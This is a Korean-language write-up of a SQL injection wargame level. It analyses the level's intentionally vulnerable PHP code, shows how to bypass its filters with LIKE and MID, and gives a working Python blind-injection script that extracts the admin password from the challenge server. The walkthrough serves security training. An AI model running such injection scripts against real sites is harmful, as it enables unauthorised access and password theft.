## Lord of SQL Injection No. 12- darknight
## 문제 출제 의도
Single quote를 사용하지 않고 SQL 문을 조작 할 수 있는지 확인한다.
## 소스 코드 분석
+ 소스 코드  
Darknight의 소스 코드는 다음과 같다.   
    ~~~   
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
    if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
    if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
    $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - Get 방식으로 받은 문자열에 'prob _ . ( )중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
    - Get 방식으로 받은 pw값에 '(single quote) 가 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
    - Get 방식으로 받은 no값에 'ascii, '(singel quote), substr , =중 하나라고 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
    - SQL문을 통해 받은 id 값이 0이 아니라면 "Hello Id"가 출력된다.
    - 문제 풀이에 성공하는 조건은 한 레코드의 id 값이 'admin'이고 pw값이 입력한 pw 값과 같을 떄 즉 id가 'admin'인 회원의 pw값을 알아내야 한다.
## 문제 해결
+ like
    - 대입 연산자를 대체하여 그 자리에 동일하게 like를 삽입하면 '='을 사용하지 않고 SQL문을 조작 가능하다.

+ MID
    ~~~
    return_value = mid ( 추출할문자열, pos, len )
    ~~~
    - substr과 동일한 기능을 하는 함수로 substr 대신 사용하면 SQL문을 조작 가능하다.

+ 코드
    - 따라서 다음과 같은 코드를 작성하면 pw값을 알 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    for i in range(1, 9):
        for j in range(48, 127):
            url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="
            data = '1 or id like "admin" and mid(pw,1,{}) like "{}"#'.format(str(i), key + chr(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
            re.add_header("Cookie", "PHPSESSID=6ckrsnfovcd74972o80ugmksb4")
            res = urllib.request.urlopen(re) 
            if str(res.read()).find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ~~~
    - 이를 실행하면 pw=1c62ba6f가 출력된다
    - 이를 URL뒤에 GET방식으로 입력하면 문제가 해결된다.